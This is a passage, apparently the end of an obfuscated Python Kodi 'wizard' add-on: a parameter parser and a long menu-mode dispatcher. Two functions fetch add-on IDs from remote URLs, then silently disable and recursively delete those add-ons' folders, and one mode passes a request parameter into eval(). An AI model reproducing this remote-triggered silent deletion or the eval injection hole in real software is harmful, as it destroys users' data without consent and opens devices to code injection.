	O00OOO0O0OO0O0O00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O000OOO00O00O0O0O ,listitem =O0OO0OOOOO0000O0O ,isFolder =False )#line:5093
	return O00OOO0O0OO0O0O00 #line:5094
def get_params ():#line:5096
	O0OO0O00000O000OO =[]#line:5097
	O0O00O000O0OO0O0O =sys .argv [2 ]#line:5098
	if len (O0O00O000O0OO0O0O )>=2 :#line:5099
		OO00000OOOO0O0OO0 =sys .argv [2 ]#line:5100
		OOO0OO0OO00O0OO0O =OO00000OOOO0O0OO0 .replace ('?','')#line:5101
		if (OO00000OOOO0O0OO0 [len (OO00000OOOO0O0OO0 )-1 ]=='/'):#line:5102
			OO00000OOOO0O0OO0 =OO00000OOOO0O0OO0 [0 :len (OO00000OOOO0O0OO0 )-2 ]#line:5103
		O000OO0OOOO0OOOOO =OOO0OO0OO00O0OO0O .split ('&')#line:5104
		O0OO0O00000O000OO ={}#line:5105
		for O0O0O0000OOOO0O00 in range (len (O000OO0OOOO0OOOOO )):#line:5106
			O0O0O0000000OOO0O ={}#line:5107
			O0O0O0000000OOO0O =O000OO0OOOO0OOOOO [O0O0O0000OOOO0O00 ].split ('=')#line:5108
			if (len (O0O0O0000000OOO0O ))==2 :#line:5109
				O0OO0O00000O000OO [O0O0O0000000OOO0O [0 ]]=O0O0O0000000OOO0O [1 ]#line:5110
		return O0OO0O00000O000OO #line:5112
def remove_addons ():#line:5114
	try :#line:5115
			import json #line:5116
			OOO0O0O00OO000O00 =urllib2 .urlopen (remove_url ).readlines ()#line:5117
			for O00OO00OO00O0000O in OOO0O0O00OO000O00 :#line:5118
				OOO000OOO0O0OO00O =O00OO00OO00O0000O .split (':')[1 ].strip ()#line:5120
				OO000O000OO00OOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OOO000OOO0O0OO00O ,'false')#line:5121
				O0O000OOO00OO0OOO =xbmc .executeJSONRPC (OO000O000OO00OOOO )#line:5122
				O00OOO000O0O0O0O0 =json .loads (O0O000OOO00OO0OOO )#line:5123
				O0O0000000O0O0000 =os .path .join (addons_folder ,OOO000OOO0O0OO00O )#line:5125
				if os .path .exists (O0O0000000O0O0000 ):#line:5127
					for O0OO00000O0OOO0O0 ,O000OOO00O0O0OOOO ,O0000O0O0O0OOO0OO in os .walk (O0O0000000O0O0000 ):#line:5128
						for O00OO0O00OO0O0O00 in O0000O0O0O0OOO0OO :#line:5129
							os .unlink (os .path .join (O0OO00000O0OOO0O0 ,O00OO0O00OO0O0O00 ))#line:5130
						for O00OOO000OOOO00OO in O000OOO00O0O0OOOO :#line:5131
							shutil .rmtree (os .path .join (O0OO00000O0OOO0O0 ,O00OOO000OOOO00OO ))#line:5132
					os .rmdir (O0O0000000O0O0000 )#line:5133
			xbmc .executebuiltin ('Container.Refresh')#line:5135
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5136
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5137
	except :pass #line:5138
def remove_addons2 ():#line:5139
	try :#line:5140
			import json #line:5141
			O0OOOO000O00O0000 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5142
			for O0O000OOO0OO0000O in O0OOOO000O00O0000 :#line:5143
				OO0OOOOOO0O0O00O0 =O0O000OOO0OO0000O .split (':')[1 ].strip ()#line:5145
				OO00OOO00O000OOO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OO0OOOOOO0O0O00O0 ,'false')#line:5146
				O0O0O0O0000OO0O0O =xbmc .executeJSONRPC (OO00OOO00O000OOO0 )#line:5147
				OO0O0OOOO0O0OO0O0 =json .loads (O0O0O0O0000OO0O0O )#line:5148
				O0OOO0O0O0000OO0O =os .path .join (user_folder ,OO0OOOOOO0O0O00O0 )#line:5150
				if os .path .exists (O0OOO0O0O0000OO0O ):#line:5152
					for OOOO0O00OOO0OOO0O ,O0O000O0OOOO000O0 ,O000OOOOOO0O00O00 in os .walk (O0OOO0O0O0000OO0O ):#line:5153
						for OO0O0O0OOO00O00OO in O000OOOOOO0O00O00 :#line:5154
							os .unlink (os .path .join (OOOO0O00OOO0OOO0O ,OO0O0O0OOO00O00OO ))#line:5155
						for O0O000OOOOO0000OO in O0O000O0OOOO000O0 :#line:5156
							shutil .rmtree (os .path .join (OOOO0O00OOO0OOO0O ,O0O000OOOOO0000OO ))#line:5157
					os .rmdir (O0OOO0O0O0000OO0O )#line:5158
	except :pass #line:5160
params =get_params ()#line:5161
url =None #line:5162
name =None #line:5163
mode =None #line:5164
try :mode =urllib .unquote_plus (params ["mode"])#line:5166
except :pass #line:5167
try :name =urllib .unquote_plus (params ["name"])#line:5168
except :pass #line:5169
try :url =urllib .unquote_plus (params ["url"])#line:5170
except :pass #line:5171
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5173
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5174
def setView (OO0O0O000O0000O0O ,OOO000000OOOO000O ):#line:5175
	if wiz .getS ('auto-view')=='true':#line:5176
		O000OO0O00OOOOO00 =wiz .getS (OOO000000OOOO000O )#line:5177
		if O000OO0O00OOOOO00 =='50'and KODIV >=17 and SKIN =='skin.estuary':O000OO0O00OOOOO00 ='55'#line:5178
		if O000OO0O00OOOOO00 =='500'and KODIV >=17 and SKIN =='skin.estuary':O000OO0O00OOOOO00 ='50'#line:5179
		wiz .ebi ("Container.SetViewMode(%s)"%O000OO0O00OOOOO00 )#line:5180
if mode ==None :index ()#line:5182
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5184
elif mode =='builds':buildMenu ()#line:5185
elif mode =='viewbuild':viewBuild (name )#line:5186
elif mode =='buildinfo':buildInfo (name )#line:5187
elif mode =='buildpreview':buildVideo (name )#line:5188
elif mode =='install':buildWizard (name ,url )#line:5189
elif mode =='theme':buildWizard (name ,mode ,url )#line:5190
elif mode =='viewthirdparty':viewThirdList (name )#line:5191
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5192
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5193
elif mode =='maint':maintMenu (name )#line:5195
elif mode =='passpin':passandpin ()#line:5196
elif mode =='backmyupbuild':backmyupbuild ()#line:5197
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5198
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5199
elif mode =='advancedsetting':advancedWindow (name )#line:5200
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5201
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5202
elif mode =='asciicheck':wiz .asciiCheck ()#line:5203
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5204
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5205
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5206
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5207
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5208
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5209
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5210
elif mode =='currentsettings':viewAdvanced ()#line:5211
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5212
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5213
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5214
elif mode =='fixskin':backtokodi ()#line:5215
elif mode =='testcommand':testcommand ()#line:5216
elif mode =='logsend':logsend ()#line:5217
elif mode =='rdon':rdon ()#line:5218
elif mode =='rdoff':rdoff ()#line:5219
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5220
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5221
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5222
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5223
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5224
elif mode =='freshstart':freshStart ()#line:5225
elif mode =='forceupdate':wiz .forceUpdate ()#line:5226
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5227
elif mode =='forceclose':wiz .killxbmc ()#line:5228
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5229
elif mode =='hidepassword':wiz .hidePassword ()#line:5230
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5231
elif mode =='enableaddons':enableAddons ()#line:5232
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5233
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5234
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5235
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5236
elif mode =='uploadlog':uploadLog .Main ()#line:5237
elif mode =='viewlog':LogViewer ()#line:5238
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5239
elif mode =='viewerrorlog':errorChecking (all =True )#line:5240
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5241
elif mode =='purgedb':purgeDb ()#line:5242
elif mode =='fixaddonupdate':fixUpdate ()#line:5243
elif mode =='removeaddons':removeAddonMenu ()#line:5244
elif mode =='removeaddon':removeAddon (name )#line:5245
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5246
elif mode =='removedata':removeAddonData (name )#line:5247
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5248
elif mode =='systeminfo':systemInfo ()#line:5249
elif mode =='restorezip':restoreit ('build')#line:5250
elif mode =='restoregui':restoreit ('gui')#line:5251
elif mode =='restoreaddon':restoreit ('addondata')#line:5252
elif mode =='restoreextzip':restoreextit ('build')#line:5253
elif mode =='restoreextgui':restoreextit ('gui')#line:5254
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5255
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5256
elif mode =='apk':apkMenu (name )#line:5258
elif mode =='apkscrape':apkScraper (name )#line:5259
elif mode =='apkinstall':apkInstaller (name ,url )#line:5260
elif mode =='speed':speedMenu ()#line:5261
elif mode =='net':net_tools ()#line:5262
elif mode =='GetList':GetList (url )#line:5263
elif mode =='youtube':youtubeMenu (name )#line:5264
elif mode =='viewVideo':playVideo (url )#line:5265
elif mode =='addons':addonMenu (name )#line:5267
elif mode =='addoninstall':addonInstaller (name ,url )#line:5268
elif mode =='savedata':saveMenu ()#line:5270
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5271
elif mode =='managedata':manageSaveData (name )#line:5272
elif mode =='whitelist':wiz .whiteList (name )#line:5273
elif mode =='trakt':traktMenu ()#line:5275
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5276
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5277
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5278
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5279
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5280
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5281
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5282
elif mode =='realdebrid':realMenu ()#line:5284
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5285
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5286
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5287
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5288
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5289
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5290
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5291
elif mode =='login':loginMenu ()#line:5293
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5294
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5295
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5296
elif mode =='clearlogin':loginit .clearSaved (name )#line:5297
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5298
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5299
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5300
elif mode =='contact':notify .contact (CONTACT )#line:5302
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5303
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5304
elif mode =='developer':developer ()#line:5306
elif mode =='converttext':wiz .convertText ()#line:5307
elif mode =='createqr':wiz .createQR ()#line:5308
elif mode =='testnotify':testnotify ()#line:5309
elif mode =='testnotify2':testnotify2 ()#line:5310
elif mode =='servicemanual':servicemanual ()#line:5311
elif mode =='fastinstall':fastinstall ()#line:5312
elif mode =='testupdate':testupdate ()#line:5313
elif mode =='testfirst':testfirst ()#line:5314
elif mode =='testfirstrun':testfirstRun ()#line:5315
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5316
elif mode =='bg':wiz .bg_install (name ,url )#line:5318
elif mode =='bgcustom':wiz .bg_custom ()#line:5319
elif mode =='bgremove':wiz .bg_remove ()#line:5320
elif mode =='bgdefault':wiz .bg_default ()#line:5321
elif mode =='rdset':rdsetup ()#line:5322
elif mode =='mor':morsetup ()#line:5323
elif mode =='mor2':morsetup2 ()#line:5324
elif mode =='resolveurl':resolveurlsetup ()#line:5325
elif mode =='urlresolver':urlresolversetup ()#line:5326
elif mode =='forcefastupdate':forcefastupdate ()#line:5327
elif mode =='traktset':traktsetup ()#line:5328
elif mode =='placentaset':placentasetup ()#line:5329
elif mode =='flixnetset':flixnetsetup ()#line:5330
elif mode =='reptiliaset':reptiliasetup ()#line:5331
elif mode =='yodasset':yodasetup ()#line:5332
elif mode =='numbersset':numberssetup ()#line:5333
elif mode =='uranusset':uranussetup ()#line:5334
elif mode =='genesisset':genesissetup ()#line:5335
elif mode =='fastupdate':fastupdate ()#line:5336
elif mode =='folderback':folderback ()#line:5337
elif mode =='menudata':Menu ()#line:5338
elif mode ==2 :#line:5340
        wiz .torent_menu ()#line:5341
elif mode ==3 :#line:5342
        wiz .popcorn_menu ()#line:5343
elif mode ==8 :#line:5344
        wiz .metaliq_fix ()#line:5345
elif mode ==9 :#line:5346
        wiz .quasar_menu ()#line:5347
elif mode ==5 :#line:5348
        swapSkins ('skin.Premium.mod')#line:5349
elif mode ==13 :#line:5350
        wiz .elementum_menu ()#line:5351
elif mode ==16 :#line:5352
        wiz .fix_wizard ()#line:5353
elif mode ==17 :#line:5354
        wiz .last_play ()#line:5355
elif mode ==18 :#line:5356
        wiz .normal_metalliq ()#line:5357
elif mode ==19 :#line:5358
        wiz .fast_metalliq ()#line:5359
elif mode ==20 :#line:5360
        wiz .fix_buffer2 ()#line:5361
elif mode ==21 :#line:5362
        wiz .fix_buffer3 ()#line:5363
elif mode ==11 :#line:5364
        wiz .fix_buffer ()#line:5365
elif mode ==15 :#line:5366
        wiz .fix_font ()#line:5367
elif mode ==14 :#line:5368
        wiz .clean_pass ()#line:5369
elif mode ==22 :#line:5370
        wiz .movie_update ()#line:5371
elif mode =='adv_settings':buffer1 ()#line:5372
elif mode =='getpass':getpass ()#line:5373
elif mode =='setpass':setpass ()#line:5374
elif mode =='setuname':setuname ()#line:5375
elif mode =='passandUsername':passandUsername ()#line:5376
elif mode =='9':disply_hwr ()#line:5377
elif mode =='99':disply_hwr2 ()#line:5378
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))